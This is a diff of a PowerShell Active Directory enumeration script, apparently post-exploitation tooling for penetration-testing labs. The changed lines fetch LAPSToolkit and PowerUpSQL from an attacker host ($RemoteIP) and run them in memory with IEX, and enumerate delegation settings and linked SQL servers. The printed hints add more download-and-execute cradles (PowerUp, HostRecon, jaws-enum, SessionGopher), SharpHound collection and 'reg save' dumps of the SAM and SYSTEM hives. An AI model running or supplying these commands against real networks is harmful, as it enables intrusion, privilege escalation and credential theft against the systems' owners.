@@ -187,17 +187,6 @@ function Invoke-Enum{
         if ($prop.RunAsPPL -eq 1)
         {
             Write-Output "`t[!] LSASS is enabled"
-            write-Output "`t[+] downloading LAPSTookkit"
-            try 
-            {
-                (new-object system.net.webclient).downloadstring("http://$RemoteIP/LAPSToolkit.ps1") | IEX
-                Get-LAPSComputers | Out-String
-            }
-            catch 
-            {
-                Write-Output "`t[!] LAPSToolkit FAILED"
-            }
-
         }
         else
         {
@@ -209,14 +198,25 @@ function Invoke-Enum{
         Write-Output $PSItem.ToString()
     }
 
+
+
+    write-Output "`t[+] downloading LAPSTookkit"
+    try 
+    {
+        (new-object system.net.webclient).downloadstring("http://$RemoteIP/LAPSToolkit.ps1") | IEX
+        Get-LAPSComputers | Out-String
+    }
+    catch 
+    {
+        Write-Output "`t[!] LAPSToolkit FAILED"
+    }
+
     Write-Output "==========================================="
 
     try
     {
         Write-Output "[+] enumerate all servers that allow unconstrained delegation"
         Get-DomainComputer -Unconstrained | Out-String
-        Write-Output "[+] all privileged users that aren't marked as sensitive/not for delegation"
-        Get-DomainUser -AllowDelegation -AdminCount | Out-String
     }
     catch
     {
@@ -287,22 +287,34 @@ function Invoke-Enum{
     }
 
 
+    try
+    {
+        Write-Output "[+] getting any Linked SQL servers"
+        (new-object system.net.webclient).downloadstring("http://$RemoteIP/PowerUpSQL.ps1") | IEX
+        Get-SQLInstanceDomain | Get-SQLServerLink -Verbose
+    }
+    catch
+    {
+        Write-Output $PSItem.ToString()
+    }
+
+
     Write-Output "==========================================="
     Write-Output "[+] Did you:"
-    Write-Output "`t[-] Check if you can impersonate anyone?"
+    Write-Output "[-] Check if you can impersonate anyone?"
     whoami /priv | findstr Impersonate | Out-String
-    Write-Output "`t[-] Sharphound.exe --ZipFileName file.zip --CollectionMethod All --Domain $env:UserDomain"
-    Write-Output "`t[-] Check SID Filtering? netdom trust $env:UserDomain /domain: <DOMAIN 2> /quarantine"
-    Write-Output "`t[+] Some other enumeration scripts to try:"
-    Write-Output "`t[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/PowerUp.ps1') | IEX; Invoke-AllChecks"
-    Write-Output "`t[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/HostRecon.ps1') | IEX; Invoke-HostRecon"
-    Write-Output "`t[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/jaws-enum.ps1') | IEX"
-    Write-Output "`t[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/SessionGopher.ps1') | IEX; Invoke-SessionGopher -Thorough"
-    Write-Output "`t[+] Can you dump the registry (not tried)?"
-    Write-Output "`t[-] reg save HKLM\sam sam.reg"
-    Write-Output "`t[-] reg save HKLM\system system.reg"
-    Write-Output "`t[^] TRY HARDER?"
-    Write-Output "`t[^] TRY HARDER?"
-    Write-Output "`t[^] TRY HARDER?"
+    Write-Output "[-] Sharphound.exe --ZipFileName file.zip --CollectionMethod All --Domain $env:UserDomain"
+    Write-Output "[-] Check SID Filtering? netdom trust $env:UserDomain /domain: <DOMAIN 2> /quarantine"
+    Write-Output "[+] Some other enumeration scripts to try:"
+    Write-Output "[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/PowerUp.ps1') | IEX; Invoke-AllChecks"
+    Write-Output "[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/HostRecon.ps1') | IEX; Invoke-HostRecon"
+    Write-Output "[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/jaws-enum.ps1') | IEX"
+    Write-Output "[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/SessionGopher.ps1') | IEX; Invoke-SessionGopher -Thorough"
+    Write-Output "[+] Can you dump the registry (not tried)?"
+    Write-Output "[-] reg save HKLM\sam sam.reg"
+    Write-Output "[-] reg save HKLM\system system.reg"
+    Write-Output "[^] TRY HARDER?"
+    Write-Output "[^] TRY HARDER?"
+    Write-Output "[^] TRY HARDER?"
     Write-Output "==========================================="
 }
